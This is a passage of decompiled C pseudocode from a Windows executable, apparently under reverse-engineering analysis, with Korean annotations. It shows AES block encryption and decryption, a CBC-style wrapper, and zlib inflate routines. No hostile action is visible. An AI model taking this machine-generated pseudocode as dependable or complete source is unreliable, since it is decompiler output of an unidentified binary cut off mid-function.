      v25 = dword_408BFC[HIBYTE(v41)] ^ dword_408FFC[v22] ^ v24;
      v12 = v43;
      v43 = v23;
      v26 = dword_4097FC[v12] ^ v25;
      LOWORD(v12) = v40;
      v6 = *(v45 - 10) ^ v26;
      v27 = v44-- == 1;
      v41 = v6;
    }
    while ( !v27 );
    v16 = v39;
    v3 = v38;
  }
  v28 = 8 * v16;
  v29 = v3[v28 + 2];
  v30 = &v3[v28 + 2];
  v44 = v29;
  result = a3;
  *a3 = HIBYTE(v29) ^ byte_4089FC[HIBYTE(v41)];
  a3[1] = BYTE2(v29) ^ byte_4089FC[BYTE2(v42)];
  a3[2] = BYTE1(v44) ^ byte_4089FC[BYTE1(v12)];
  v32 = HIBYTE(v42);
  a3[3] = v44 ^ byte_4089FC[v43];
  LOBYTE(v32) = byte_4089FC[v32];
  v44 = v30[1];
  v33 = BYTE2(v40);
  a3[4] = HIBYTE(v44) ^ v32;
  BYTE1(v32) = BYTE1(v44);
  a3[5] = BYTE2(v44) ^ byte_4089FC[v33];
  a3[6] = BYTE1(v32) ^ byte_4089FC[BYTE1(v43)];
  v34 = HIBYTE(v40);
  a3[7] = v44 ^ byte_4089FC[v41];
  LOBYTE(v34) = byte_4089FC[v34];
  v44 = v30[2];
  v35 = BYTE2(v43);
  a3[8] = HIBYTE(v44) ^ v34;
  BYTE1(v34) = BYTE1(v44);
  a3[9] = BYTE2(v44) ^ byte_4089FC[v35];
  a3[10] = BYTE1(v34) ^ byte_4089FC[BYTE1(v41)];
  a3[11] = v44 ^ byte_4089FC[v42];
  v36 = v30[3];
  v44 = v36;
  a3[12] = HIBYTE(v36) ^ byte_4089FC[HIBYTE(v43)];
  a3[13] = BYTE2(v36) ^ byte_4089FC[BYTE2(v41)];
  a3[14] = BYTE1(v36) ^ byte_4089FC[BYTE1(v42)];
  a3[15] = v44 ^ byte_4089FC[v12];
  return result;
}


// --- Metadata ---
// Function Name: encryptAES_4031BC
// Address: 0x4031BC
// Signature: unknown_signature
// ---------------
_BYTE *__thiscall encryptAES_4031BC(int this, unsigned __int8 *inputBlock, _BYTE *outputBlock)
{
  _DWORD *key; // edi
  unsigned __int16 v4; // dx
  int v5; // ecx
  int v6; // edx
  int v7; // esi
  int v8; // esi
  int v9; // esi
  int v10; // edx
  int v11; // esi
  int v12; // esi
  int v13; // edx
  int v14; // esi
  int v15; // eax
  _DWORD *v16; // edx
  int v17; // edi
  int v18; // eax
  int v19; // edx
  int v20; // ecx
  int v21; // ecx
  int v22; // ecx
  int v23; // edx
  bool v24; // zf
  int v25; // eax
  int v26; // edx
  _DWORD *v27; // edi
  _BYTE *result; // eax
  char v29; // bl
  int v30; // edx
  int v31; // ebx
  int v32; // edx
  int v33; // ebx
  int v34; // edx
  int v35; // edi
  char pExceptionObject[12]; // [esp+4h] [ebp-2Ch] BYREF
  int v37; // [esp+10h] [ebp-20h]
  _DWORD *v38; // [esp+14h] [ebp-1Ch]
  int v39; // [esp+18h] [ebp-18h]
  int v40; // [esp+1Ch] [ebp-14h]
  int v41; // [esp+20h] [ebp-10h]
  int v42; // [esp+24h] [ebp-Ch]
  int v43; // [esp+28h] [ebp-8h]
  int v44; // [esp+2Ch] [ebp-4h]
  _DWORD *inputBlocka; // [esp+38h] [ebp+8h]

  key = this;
  v38 = this;
  if ( !*(this + 4) )
  {
    exception::exception(pExceptionObject, &off_40F570);
    CxxThrowException(pExceptionObject, &_TI1_AVexception__);
  }
  LOBYTE(v4) = 0;
  HIBYTE(v4) = inputBlock[2];
  v5 = *(this + 488) ^ (inputBlock[3] | v4 | (inputBlock[1] << 16) | (*inputBlock << 24));
  v6 = inputBlock[5];
  v7 = inputBlock[4] << 24;
  v40 = v5;
  v8 = (v6 << 16) | v7;
  LOBYTE(v6) = 0;
  BYTE1(v6) = inputBlock[6];
  v9 = key[123] ^ (inputBlock[7] | v6 | v8);
  v10 = inputBlock[9];
  v41 = v9;
  v11 = (v10 << 16) | (inputBlock[8] << 24);
  LOBYTE(v10) = 0;
  BYTE1(v10) = inputBlock[10];
  v12 = key[124] ^ (inputBlock[11] | v10 | v11);
  v13 = inputBlock[13];
  v42 = v12;
  v14 = (v13 << 16) | (inputBlock[12] << 24);
  BYTE1(v13) = inputBlock[14];
  LOBYTE(v13) = inputBlock[15];
  v15 = key[260];
  v37 = v15;
  v43 = key[125] ^ (v14 | v13);
  if ( v15 > 1 )
  {
    v16 = key + 132;
    inputBlocka = key + 132;
    v44 = v15 - 1;
    do
    {
      v17 = *(v16 - 1) ^ dword_40A7FC[v42] ^ dword_409FFC[BYTE2(v40)] ^ dword_409BFC[HIBYTE(v41)] ^ dword_40A3FC[BYTE1(v43)];
      v18 = *v16 ^ dword_40A7FC[v43] ^ dword_40A3FC[BYTE1(v5)] ^ dword_409FFC[BYTE2(v41)] ^ dword_409BFC[HIBYTE(v42)];
      v39 = inputBlocka[1] ^ dword_40A7FC[v5] ^ dword_40A3FC[BYTE1(v41)] ^ dword_409FFC[BYTE2(v42)] ^ dword_409BFC[HIBYTE(v43)];
      v19 = BYTE1(v42);
      v20 = dword_409FFC[BYTE2(v43)];
      v42 = v18;
      v21 = dword_40A3FC[v19] ^ v20;
      v43 = v39;
      v22 = dword_409BFC[HIBYTE(v40)] ^ v21;
      v23 = v41;
      v41 = v17;
      v5 = *(inputBlocka - 2) ^ dword_40A7FC[v23] ^ v22;
      v16 = inputBlocka + 8;
      v24 = v44-- == 1;
      inputBlocka += 8;
      v40 = v5;
    }
    while ( !v24 );
    key = v38;
    v15 = v37;
  }
  v25 = 8 * v15;
  v26 = key[v25 + 122];
  v27 = &key[v25 + 122];
  v44 = v26;
  result = outputBlock;
  *outputBlock = HIBYTE(v26) ^ byte_408AFC[HIBYTE(v40)];
  v29 = BYTE2(v26) ^ byte_408AFC[BYTE2(v43)];
  v30 = BYTE1(v42);
  outputBlock[1] = v29;
  outputBlock[2] = BYTE1(v44) ^ byte_408AFC[v30];
  v31 = HIBYTE(v41);
  outputBlock[3] = v44 ^ byte_408AFC[v41];
  LOBYTE(v31) = byte_408AFC[v31];
  v44 = v27[1];
  v32 = BYTE2(v40);
  outputBlock[4] = HIBYTE(v44) ^ v31;
  BYTE1(v31) = BYTE1(v44);
  outputBlock[5] = BYTE2(v44) ^ byte_408AFC[v32];
  outputBlock[6] = BYTE1(v31) ^ byte_408AFC[BYTE1(v43)];
  v33 = HIBYTE(v42);
  outputBlock[7] = v44 ^ byte_408AFC[v42];
  LOBYTE(v33) = byte_408AFC[v33];
  v44 = v27[2];
  v34 = BYTE2(v41);
  outputBlock[8] = HIBYTE(v44) ^ v33;
  BYTE1(v33) = BYTE1(v44);
  outputBlock[9] = BYTE2(v44) ^ byte_408AFC[v34];
  outputBlock[10] = BYTE1(v33) ^ byte_408AFC[BYTE1(v5)];
  outputBlock[11] = v44 ^ byte_408AFC[v43];
  v35 = v27[3];
  v44 = v35;
  outputBlock[12] = HIBYTE(v35) ^ byte_408AFC[HIBYTE(v43)];
  outputBlock[13] = BYTE2(v35) ^ byte_408AFC[BYTE2(v42)];
  outputBlock[14] = BYTE1(v35) ^ byte_408AFC[BYTE1(v41)];
  outputBlock[15] = v44 ^ byte_408AFC[v5];
  return result;
}


// --- Metadata ---
// Function Name: AES_BlockTransform_decrypt_40350F
// Address: 0x40350F
// Signature: unknown_signature
// ---------------
unsigned __int8 __thiscall AES_BlockTransform_decrypt_40350F(int this, unsigned __int8 *a2, _BYTE *a3)
{
  int v4; // eax
  unsigned __int8 result; // al
  int v6; // edi
  int v7; // eax
  int v8; // ecx
  int v9; // eax
  int *v10; // eax
  unsigned __int8 *v11; // ecx
  int v12; // edx
  _BYTE *v13; // ecx
  int *v14; // edx
  _DWORD *v15; // ebx
  bool v16; // cc
  int v17; // ecx
  int v18; // ebx
  _DWORD *v19; // eax
  _BYTE *v20; // ecx
  int v21; // ebx
  int v22; // edx
  _BYTE *v23; // ecx
  char pExceptionObject[12]; // [esp+Ch] [ebp-34h] BYREF
  int v25; // [esp+18h] [ebp-28h]
  int v26; // [esp+1Ch] [ebp-24h]
  int v27; // [esp+20h] [ebp-20h]
  int v28; // [esp+24h] [ebp-1Ch]
  int v29; // [esp+28h] [ebp-18h]
  int v30; // [esp+2Ch] [ebp-14h]
  int v31; // [esp+30h] [ebp-10h]
  int v32; // [esp+34h] [ebp-Ch]
  _DWORD *v33; // [esp+38h] [ebp-8h]
  _DWORD *v34; // [esp+3Ch] [ebp-4h]
  int v35; // [esp+48h] [ebp+8h]
  int v36; // [esp+48h] [ebp+8h]
  int v37; // [esp+4Ch] [ebp+Ch]

  if ( !*(this + 4) )
  {
    exception::exception(pExceptionObject, &off_40F570);
    CxxThrowException(pExceptionObject, &_TI1_AVexception__);
  }
  v4 = *(this + 972);
  if ( v4 == 16 )
    return decryptAES_402E7E(this, a2, a3);
  v6 = v4 / 4;
  v7 = 8 * (v4 / 4 != 4 ? (v4 / 4 != 6) + 1 : 0);
  v29 = dword_40BC24[v7];
  v8 = dword_40BC2C[v7];
  v9 = dword_40BC34[v7];
  v30 = v8;
  v28 = v9;
  v10 = (this + 1108);
  if ( v6 > 0 )
  {
    v32 = v6;
    v34 = (this + 8);
    v11 = a2;
    do
    {
      v12 = *v11 << 24;
      v13 = v11 + 1;
      *v10 = v12;
      *v10 |= *v13++ << 16;
      LOBYTE(v12) = 0;
      BYTE1(v12) = *v13;
      *v10 |= v12;
      ++v13;
      v14 = v10;
      *v10 |= *v13;
      v15 = v34++;
      v11 = v13 + 1;
      ++v10;
      *v14 ^= *v15;
      --v32;
    }
    while ( v32 );
  }
  result = 1;
  v16 = *(this + 1040) <= 1;
  v32 = 1;
  if ( !v16 )
  {
    v33 = (this + 40);
    do
    {
      if ( v6 > 0 )
      {
        v34 = v33;
        v35 = v29;
        v27 = v30 - v29;
        v17 = this + 1076;
        v26 = v28 - v29;
        v31 = v6;
        do
        {
          v25 = *(this + 4 * ((v35 + v27) % v6) + 1109);
          v18 = dword_408BFC[*(v17 + 35)] ^ dword_408FFC[*(this + 4 * (v35 % v6) + 1110)] ^ dword_4097FC[*(this + 4 * ((v35 + v26) % v6) + 1108)] ^ dword_4093FC[v25];
          v19 = v34++;
          *v17 = *v19 ^ v18;
          v17 += 4;
          ++v35;
          --v31;
        }
        while ( v31 );
      }
      memcpy((this + 1108), (this + 1076), 4 * v6);
      v33 += 8;
      result = ++v32;
    }
    while ( v32 < *(this + 1040) );
  }
  v34 = 0;
  if ( v6 > 0 )
  {
    v20 = a3;
    v21 = v30;
    v37 = this + 1108;
    v25 = v29 - v30;
    v26 = v28 - v30;
    do
    {
      v22 = v37;
      v37 += 4;
      v36 = *(this + 4 * &v34[2 * *(this + 1040)] + 8);
      *v20 = HIBYTE(v36) ^ byte_4089FC[*(v22 + 3)];
      v23 = v20 + 1;
      *v23++ = BYTE2(v36) ^ byte_4089FC[*(this + 4 * ((v21 + v25) % v6) + 1110)];
      *v23++ = BYTE1(v36) ^ byte_4089FC[*(this + 4 * (v21 % v6) + 1109)];
      result = v36 ^ byte_4089FC[*(this + 4 * ((v21 + v26) % v6) + 1108)];
      *v23 = result;
      v20 = v23 + 1;
      v34 = (v34 + 1);
      ++v21;
    }
    while ( v34 < v6 );
  }
  return result;
}


// --- Metadata ---
// Function Name: AES_BlockTransform_encrypt_403797
// Address: 0x403797
// Signature: unknown_signature
// ---------------
unsigned __int8 __thiscall AES_BlockTransform_encrypt_403797(int this, unsigned __int8 *inputBlock, _BYTE *outputBlock)
{
  int keylength; // eax
  unsigned __int8 result; // al
  int v6; // edi
  int v7; // eax
  int v8; // ecx
  int v9; // eax
  int *v10; // eax
  unsigned __int8 *v11; // ecx
  int v12; // edx
  _BYTE *v13; // ecx
  int *v14; // edx
  _DWORD *v15; // ebx
  bool v16; // cc
  int v17; // ecx
  int v18; // ebx
  _DWORD *v19; // eax
  _BYTE *v20; // ecx
  int v21; // ebx
  int v22; // edx
  _BYTE *v23; // ecx
  char pExceptionObject[12]; // [esp+Ch] [ebp-34h] BYREF
  int v25; // [esp+18h] [ebp-28h]
  int v26; // [esp+1Ch] [ebp-24h]
  int v27; // [esp+20h] [ebp-20h]
  int v28; // [esp+24h] [ebp-1Ch]
  int v29; // [esp+28h] [ebp-18h]
  int v30; // [esp+2Ch] [ebp-14h]
  int v31; // [esp+30h] [ebp-10h]
  int v32; // [esp+34h] [ebp-Ch]
  _DWORD *v33; // [esp+38h] [ebp-8h]
  _DWORD *v34; // [esp+3Ch] [ebp-4h]
  int inputBlocka; // [esp+48h] [ebp+8h]
  int inputBlockb; // [esp+48h] [ebp+8h]
  int outputBlocka; // [esp+4Ch] [ebp+Ch]

  if ( !*(this + 4) )                           // 초기화 
  {
    exception::exception(pExceptionObject, &off_40F570);
    CxxThrowException(pExceptionObject, &_TI1_AVexception__);
  }
  keylength = *(this + 972);
  if ( keylength == 16 )
    return encryptAES_4031BC(this, inputBlock, outputBlock);
  v6 = keylength / 4;
  v7 = 8 * (keylength / 4 != 4 ? (keylength / 4 != 6) + 1 : 0);
  v29 = dword_40BC28[v7];
  v8 = dword_40BC30[v7];
  v9 = dword_40BC38[v7];
  v30 = v8;
  v28 = v9;
  v10 = (this + 1108);
  if ( v6 > 0 )
  {
    v32 = v6;
    v34 = (this + 488);
    v11 = inputBlock;
    do
    {
      v12 = *v11 << 24;
      v13 = v11 + 1;
      *v10 = v12;
      *v10 |= *v13++ << 16;
      LOBYTE(v12) = 0;
      BYTE1(v12) = *v13;
      *v10 |= v12;
      ++v13;
      v14 = v10;
      *v10 |= *v13;
      v15 = v34++;
      v11 = v13 + 1;
      ++v10;
      *v14 ^= *v15;
      --v32;
    }
    while ( v32 );
  }
  result = 1;
  v16 = *(this + 1040) <= 1;
  v32 = 1;
  if ( !v16 )
  {
    v33 = (this + 520);
    do
    {
      if ( v6 > 0 )
      {
        v34 = v33;
        inputBlocka = v29;
        v27 = v30 - v29;
        v17 = this + 1076;
        v26 = v28 - v29;
        v31 = v6;
        do
        {
          v25 = *(this + 4 * ((inputBlocka + v27) % v6) + 1109);
          v18 = dword_409BFC[*(v17 + 35)] ^ dword_409FFC[*(this + 4 * (inputBlocka % v6) + 1110)] ^ dword_40A7FC[*(this + 4 * ((inputBlocka + v26) % v6) + 1108)] ^ dword_40A3FC[v25];
          v19 = v34++;
          *v17 = *v19 ^ v18;
          v17 += 4;
          ++inputBlocka;
          --v31;
        }
        while ( v31 );
      }
      memcpy((this + 1108), (this + 1076), 4 * v6);
      v33 += 8;
      result = ++v32;
    }
    while ( v32 < *(this + 1040) );
  }
  v34 = 0;
  if ( v6 > 0 )
  {
    v20 = outputBlock;
    v21 = v30;
    outputBlocka = this + 1108;
    v25 = v29 - v30;
    v26 = v28 - v30;
    do
    {
      v22 = outputBlocka;
      outputBlocka += 4;
      inputBlockb = *(this + 4 * &v34[2 * *(this + 1040)] + 488);
      *v20 = HIBYTE(inputBlockb) ^ byte_408AFC[*(v22 + 3)];
      v23 = v20 + 1;
      *v23++ = BYTE2(inputBlockb) ^ byte_408AFC[*(this + 4 * ((v21 + v25) % v6) + 1110)];
      *v23++ = BYTE1(inputBlockb) ^ byte_408AFC[*(this + 4 * (v21 % v6) + 1109)];
      result = inputBlockb ^ byte_408AFC[*(this + 4 * ((v21 + v26) % v6) + 1108)];
      *v23 = result;
      v20 = v23 + 1;
      v34 = (v34 + 1);
      ++v21;
    }
    while ( v34 < v6 );
  }
  return result;
}


// --- Metadata ---
// Function Name: XOR_Block_403A28
// Address: 0x403A28
// Signature: unknown_signature
// ---------------
void __thiscall XOR_Block_403A28(int this, _BYTE *a2, _BYTE *a3)
{
  int i; // esi
  char pExceptionObject[12]; // [esp+4h] [ebp-Ch] BYREF

  if ( !*(this + 4) )
  {
    exception::exception(pExceptionObject, &off_40F570);
    CxxThrowException(pExceptionObject, &_TI1_AVexception__);
  }
  for ( i = 0; i < *(this + 972); ++i )
    *a2++ ^= *a3++;
}


// --- Metadata ---
// Function Name: AES_EncryptDecrypt_403A77
// Address: 0x403A77
// Signature: unknown_signature
// ---------------
unsigned int __thiscall AES_EncryptDecrypt_403A77(int this, void *RawData, int outputBuffer, int datalength, int mode)
{
  unsigned int v6; // ecx
  unsigned __int8 *v7; // edi
  unsigned int result; // eax
  _BYTE *v9; // ebx
  unsigned int v10; // ecx
  bool v11; // zf
  _BYTE *v12; // edi
  _BYTE *v13; // ebx
  unsigned int v14; // ecx
  unsigned int v15; // ecx
  char pExceptionObject[12]; // [esp+Ch] [ebp-Ch] BYREF
  unsigned int encryptORdecrypta; // [esp+2Ch] [ebp+14h]
  unsigned int encryptORdecryptb; // [esp+2Ch] [ebp+14h]

  if ( !*(this + 4) )
  {
    exception::exception(pExceptionObject, &off_40F570);
    CxxThrowException(pExceptionObject, &_TI1_AVexception__);
  }
  if ( !datalength || (v6 = *(this + 972), datalength % v6) )
  {
    exception::exception(pExceptionObject, &off_40F574);
    CxxThrowException(pExceptionObject, &_TI1_AVexception__);
  }
  if ( mode == 1 )                              // 암호화 
  {
    v7 = RawData;
    result = datalength / v6;
    encryptORdecrypta = 0;
    v9 = outputBuffer;
    if ( datalength / v6 )
    {
      do
      {
        AES_BlockTransform_encrypt_403797(this, v7, v9);
        XOR_Block_403A28(this, v9, (this + 1008));
        memcpy((this + 1008), v7, *(this + 972));
        v10 = *(this + 972);
        result = datalength / v10;
        v7 += v10;
        v9 += v10;
        ++encryptORdecrypta;
      }
      while ( encryptORdecrypta < datalength / v10 );
    }
  }
  else                                          // 복호화 
  {
    v11 = mode == 2;
    v12 = RawData;
    encryptORdecryptb = 0;
    v13 = outputBuffer;
    if ( v11 )
    {
      result = datalength / v6;
      if ( datalength / v6 )
      {
        do
        {
          AES_BlockTransform_decrypt_40350F(this, (this + 1008), v13);
          XOR_Block_403A28(this, v13, v12);
          memcpy((this + 1008), v12, *(this + 972));
          v14 = *(this + 972);
          result = datalength / v14;
          v12 += v14;
          v13 += v14;
          ++encryptORdecryptb;
        }
        while ( encryptORdecryptb < datalength / v14 );
      }
    }
    else
    {
      result = datalength / v6;
      if ( datalength / v6 )
      {
        do
        {
          AES_BlockTransform_encrypt_403797(this, v12, v13);
          v15 = *(this + 972);
          v12 += v15;
          result = datalength / v15;
          v13 += v15;
          ++encryptORdecryptb;
        }
        while ( encryptORdecryptb < datalength / v15 );
      }
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: copyBufferedDataWithCallback_403BD6
// Address: 0x403BD6
// Signature: unknown_signature
// ---------------
int __cdecl copyBufferedDataWithCallback_403BD6(int circularBuffer, void *outputSTream, int a3)
{
  char *v4; // ecx
  unsigned int v5; // ebx
  size_t v6; // eax
  size_t v7; // ebx
  int (__cdecl *v8)(_DWORD, char *, size_t); // eax
  int v9; // eax
  char *v10; // eax
  char *v11; // ecx
  size_t v12; // eax
  size_t v13; // ebx
  int (__cdecl *v14)(_DWORD, char *, size_t); // eax
  int v15; // eax
  char *v17; // [esp+Ch] [ebp-4h]
  char *Srca; // [esp+1Ch] [ebp+Ch]

  v4 = *(circularBuffer + 48);                  // 원형 버퍼에서 데이터를 복사하고, 콜백으로 처리한 후 출력 버퍼에 전달하는 역할 
  v5 = *(circularBuffer + 52);
  v17 = *(outputSTream + 3);
  Srca = v4;
  if ( v4 > v5 )
    v5 = *(circularBuffer + 44);
  v6 = *(outputSTream + 4);
  v7 = v5 - v4;
  if ( v7 > v6 )
    v7 = *(outputSTream + 4);
  if ( v7 && a3 == -5 )
    a3 = 0;
  *(outputSTream + 5) += v7;
  *(outputSTream + 4) = v6 - v7;
  v8 = *(circularBuffer + 56);
  if ( v8 )
  {
    v9 = v8(*(circularBuffer + 60), v4, v7);
    *(circularBuffer + 60) = v9;
    *(outputSTream + 12) = v9;
  }
  if ( v7 )
  {
    memcpy(v17, Srca, v7);
    v17 += v7;
    Srca += v7;
  }
  v10 = *(circularBuffer + 44);
  if ( Srca == v10 )
  {
    v11 = *(circularBuffer + 40);
    Srca = v11;
    if ( *(circularBuffer + 52) == v10 )
      *(circularBuffer + 52) = v11;
    v12 = *(outputSTream + 4);
    v13 = *(circularBuffer + 52) - v11;
    if ( v13 > v12 )
      v13 = *(outputSTream + 4);
    if ( v13 && a3 == -5 )
      a3 = 0;
    *(outputSTream + 5) += v13;
    *(outputSTream + 4) = v12 - v13;
    v14 = *(circularBuffer + 56);
    if ( v14 )
    {
      v15 = v14(*(circularBuffer + 60), v11, v13);
      *(circularBuffer + 60) = v15;
      *(outputSTream + 12) = v15;
    }
    if ( v13 )
    {
      memcpy(v17, Srca, v13);
      v17 += v13;
      Srca += v13;
    }
  }
  *(outputSTream + 3) = v17;
  *(circularBuffer + 48) = Srca;
  return a3;
}


// --- Metadata ---
// Function Name: initObject_403CC8
// Address: 0x403CC8
// Signature: unknown_signature
// ---------------
int __cdecl initObject_403CC8(char a1, char a2, int a3, int a4, int a5)
{
  int result; // eax

  result = (*(a5 + 32))(*(a5 + 40), 1, 28);     // calloc 스타일 
  if ( result )
  {
    *result = 0;
    *(result + 16) = a1;                        // 구조체 객체 초기화 
    *(result + 17) = a2;
    *(result + 20) = a3;
    *(result + 24) = a4;
  }
  return result;
}


// --- Metadata ---
// Function Name: InflateMainLoop_403CFC
// Address: 0x403CFC
// Signature: unknown_signature
// ---------------
int __cdecl InflateMainLoop_403CFC(int inflate_state, void *z_stream, int flag)
{
  _BYTE *v5; // edx 압축 해제 메인 루프 
  int v6; // ebx
  unsigned int v7; // eax
  unsigned int v8; // eax
  unsigned __int8 *v9; // ecx
  unsigned int v10; // eax
  unsigned int v11; // eax
  unsigned __int8 *v12; // ecx
  int v13; // eax
  int v14; // eax
  unsigned int v15; // eax
  int v16; // ecx
  int v17; // eax
  unsigned int v18; // eax
  unsigned int v19; // eax
  int v20; // ecx
  int v21; // eax
  unsigned int v22; // ecx
  unsigned int v23; // eax
  unsigned int v24; // ecx
  int v25; // eax
  unsigned int v26; // eax
  unsigned int v27; // ecx
  unsigned int v29; // eax
  unsigned int v30; // ecx
  int v31; // eax
  unsigned int v32; // eax
  unsigned int v33; // ecx
  unsigned __int8 *v34; // ecx
  int result; // eax
  unsigned __int8 *v36; // ecx
  int v37; // eax
  unsigned __int8 *v38; // ebx
  unsigned __int8 *v39; // ecx
  unsigned __int8 *v40; // ecx
  unsigned int v41; // [esp+Ch] [ebp-18h]
  unsigned int v42; // [esp+Ch] [ebp-18h]
  unsigned __int8 *v43; // [esp+10h] [ebp-14h]
  unsigned __int8 *v44; // [esp+10h] [ebp-14h]
  _BYTE *v45; // [esp+10h] [ebp-14h]
  _BYTE *v46; // [esp+10h] [ebp-14h]
  _BYTE *v47; // [esp+14h] [ebp-10h]
  unsigned int v48; // [esp+18h] [ebp-Ch]
  unsigned int v49; // [esp+1Ch] [ebp-8h]
  unsigned __int8 *v50; // [esp+20h] [ebp-4h]
  unsigned int inflate_statea; // [esp+2Ch] [ebp+8h]
  unsigned int Srca; // [esp+30h] [ebp+Ch]

  v50 = *z_stream;
  v5 = *(inflate_state + 52);
  v49 = *(z_stream + 1);
  v6 = *(inflate_state + 4);
  Srca = *(inflate_state + 32);
  inflate_statea = *(inflate_state + 28);
  v7 = *(inflate_state + 48);
  if ( v5 >= v7 )
    v8 = *(inflate_state + 44) - v5;
  else
    v8 = v7 - v5 - 1;
  v48 = v8;
  while ( 2 )
  {
    switch ( *v6 )
    {
      case 0:
        if ( v8 >= 0x102 && v49 >= 0xA )
        {
          *(inflate_state + 32) = Srca;
          *(inflate_state + 28) = inflate_statea;
          *(z_stream + 1) = v49;
          v9 = &v50[-*z_stream];
          *z_stream = v50;
          *(z_stream + 2) += v9;
          *(inflate_state + 52) = v5;
          flag = InflateHuffmanBlock_40514D(*(v6 + 16), *(v6 + 17), *(v6 + 20), *(v6 + 24), inflate_state, z_stream);
          v50 = *z_stream;
          v5 = *(inflate_state + 52);
          v49 = *(z_stream + 1);
          Srca = *(inflate_state + 32);
          inflate_statea = *(inflate_state + 28);
          v10 = *(inflate_state + 48);
          v8 = v5 >= v10 ? *(inflate_state + 44) - v5 : v10 - v5 - 1;
          v48 = v8;
          if ( flag )
          {
            *v6 = flag != 1 ? 9 : 7;
            continue;
          }
        }
        *(v6 + 12) = *(v6 + 16);
        *(v6 + 8) = *(v6 + 20);
        *v6 = 1;
        goto LABEL_14;
      case 1:
LABEL_14:
        while ( 2 )
        {
          v11 = *(v6 + 12);
          if ( inflate_statea < v11 )
          {
            if ( v49 )
            {
              flag = 0;
              --v49;
              Srca |= *v50++ << inflate_statea;
              inflate_statea += 8;
              continue;
            }
            goto LABEL_81;
          }
          break;
        }
        v43 = (*(v6 + 8) + 8 * (Srca & dword_40BCA8[v11]));
        Srca >>= v43[1];
        v12 = v43;
        inflate_statea -= v43[1];
        v13 = *v43;
        if ( !*v43 )
        {
          v14 = *(v43 + 1);
          *v6 = 6;
          *(v6 + 8) = v14;
          goto LABEL_19;
        }
        if ( (v13 & 0x10) != 0 )
        {
          *(v6 + 8) = v13 & 0xF;
          *(v6 + 4) = *(v43 + 1);
          *v6 = 2;
          goto LABEL_19;
        }
        if ( (v13 & 0x40) == 0 )
          goto LABEL_35;
        if ( (v13 & 0x20) == 0 )
        {
          *v6 = 9;
          *(z_stream + 6) = "invalid literal/length code";
LABEL_83:
          *(inflate_state + 32) = Srca;
          *(inflate_state + 28) = inflate_statea;
          *(z_stream + 1) = v49;
          v34 = &v50[-*z_stream];
          *z_stream = v50;
          *(z_stream + 2) += v34;
          *(inflate_state + 52) = v5;
          return copyBufferedDataWithCallback_403BD6(inflate_state, z_stream, -3);
        }
        *v6 = 7;
        goto LABEL_19;
      case 2:
        while ( 2 )
        {
          v15 = *(v6 + 8);
          if ( inflate_statea < v15 )
          {
            if ( v49 )
            {
              flag = 0;
              --v49;
              Srca |= *v50++ << inflate_statea;
              inflate_statea += 8;
              continue;
            }
            goto LABEL_81;
          }
          break;
        }
        v16 = *(v6 + 8);
        v17 = Srca & dword_40BCA8[v15];
        *v6 = 3;
        Srca >>= v16;
        *(v6 + 4) += v17;
        inflate_statea -= v16;
        *(v6 + 12) = *(v6 + 17);
        *(v6 + 8) = *(v6 + 24);
LABEL_29:
        while ( 1 )
        {
          v18 = *(v6 + 12);
          if ( inflate_statea >= v18 )
            break;
          if ( !v49 )
            goto LABEL_81;
          flag = 0;
          --v49;
          Srca |= *v50++ << inflate_statea;
          inflate_statea += 8;
        }
        v44 = (*(v6 + 8) + 8 * (Srca & dword_40BCA8[v18]));
        Srca >>= v44[1];
        v12 = v44;
        inflate_statea -= v44[1];
        v13 = *v44;
        if ( (v13 & 0x10) != 0 )
        {
          *(v6 + 8) = v13 & 0xF;
          *(v6 + 12) = *(v44 + 1);
          *v6 = 4;
        }
        else
        {
          if ( (v13 & 0x40) != 0 )
          {
            *v6 = 9;
            *(z_stream + 6) = "invalid distance code";
            goto LABEL_83;
          }
LABEL_35:
          *(v6 + 12) = v13;
          *(v6 + 8) = &v12[8 * *(v12 + 1)];
        }
LABEL_19:
        v8 = v48;
        continue;
      case 3:
        goto LABEL_29;
      case 4:
LABEL_36:
        v19 = *(v6 + 8);
        if ( inflate_statea >= v19 )
        {
          v20 = *(v6 + 8);
          v21 = Srca & dword_40BCA8[v19];
          *v6 = 5;
          Srca >>= v20;
          *(v6 + 12) += v21;
          inflate_statea -= v20;
LABEL_40:
          v22 = *(inflate_state + 40);
          v47 = &v5[-*(v6 + 12)];
          if ( v47 < v22 )
          {
            do
              v47 += *(inflate_state + 44) - v22;
            while ( v47 < *(inflate_state + 40) );
          }
          v8 = v48;
          if ( *(v6 + 4) )
          {
            while ( 1 )
            {
              if ( !v8 )
              {
                if ( v5 != *(inflate_state + 44)
                  || (v23 = *(inflate_state + 48), v24 = *(inflate_state + 40), v23 == v24)
                  || ((v5 = *(inflate_state + 40), v24 >= v23) ? (v8 = *(inflate_state + 44) - v24) : (v8 = v23 - v24 - 1),
                      !v8) )
                {
                  *(inflate_state + 52) = v5;
                  v25 = copyBufferedDataWithCallback_403BD6(inflate_state, z_stream, flag);
                  v5 = *(inflate_state + 52);
                  flag = v25;
                  v26 = *(inflate_state + 48);
                  v41 = v26;
                  if ( v5 >= v26 )
                    v8 = *(inflate_state + 44) - v5;
                  else
                    v8 = v26 - v5 - 1;
                  v45 = *(inflate_state + 44);
                  if ( v5 == v45 )
                  {
                    v27 = *(inflate_state + 40);
                    if ( v41 != v27 )
                    {
                      v5 = *(inflate_state + 40);
                      if ( v27 >= v41 )
                        v8 = &v45[-v27];
                      else
                        v8 = v41 - v27 - 1;
                    }
                  }
                  if ( !v8 )
                    break;
                }
              }
              flag = 0;
              *v5++ = *v47++;
              v48 = --v8;
              if ( v47 == *(inflate_state + 44) )
                v47 = *(inflate_state + 40);
              if ( (*(v6 + 4))-- == 1 )
                goto LABEL_80;
            }
LABEL_85:
            *(inflate_state + 32) = Srca;
            *(inflate_state + 28) = inflate_statea;
            *(z_stream + 1) = v49;
            goto LABEL_86;
          }
LABEL_80:
          *v6 = 0;
          continue;
        }
        if ( v49 )
        {
          flag = 0;
          --v49;
          Srca |= *v50++ << inflate_statea;
          inflate_statea += 8;
          goto LABEL_36;
        }
LABEL_81:
        *(inflate_state + 32) = Srca;
        *(inflate_state + 28) = inflate_statea;
        *(z_stream + 1) = 0;
LABEL_86:
        v36 = &v50[-*z_stream];
        *z_stream = v50;
        *(z_stream + 2) += v36;
        *(inflate_state + 52) = v5;
        return copyBufferedDataWithCallback_403BD6(inflate_state, z_stream, flag);
      case 5:
        goto LABEL_40;
      case 6:
        if ( !v8 )
        {
          if ( v5 != *(inflate_state + 44)
            || (v29 = *(inflate_state + 48), v30 = *(inflate_state + 40), v29 == v30)
